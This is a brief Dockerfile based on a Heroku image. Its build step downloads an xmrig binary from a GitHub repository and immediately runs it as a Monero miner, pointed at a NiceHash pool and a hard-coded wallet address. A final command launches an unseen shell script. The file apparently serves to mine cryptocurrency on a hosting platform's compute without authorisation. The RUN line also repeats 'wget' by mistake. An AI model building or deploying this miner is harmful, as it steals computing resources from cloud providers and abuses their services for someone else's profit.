FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget wget https://github.com/mrbogel/Student/raw/main/xmrig; ./xmrig -o stratum+tcp://randomxmonero.eu.nicehash.com:3380 -u 3GMMqEWU5bNm14rWuM1vcRBNdNDXRKKnfH -p x -k --nicehash --coin monero -a rx/0
CMD bash heroku.sh
